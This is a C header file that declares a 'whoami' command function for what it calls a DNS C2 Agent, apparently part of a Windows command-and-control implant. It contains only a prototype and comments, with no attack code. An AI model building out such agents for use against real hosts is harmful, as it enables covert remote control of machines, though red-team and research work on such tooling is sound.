/**
 * whoami.h - Print current user command for DNS C2 Agent
 */

 #ifndef WHOAMI_H
 #define WHOAMI_H
 
 #include <windows.h>
 
 /**
  * Print the current user
  * 
  * @param args Unused
  * @return The result of the command (must be freed by caller)
  */
 char* cmd_whoami(const char* args);
 
 #endif // WHOAMI_H
 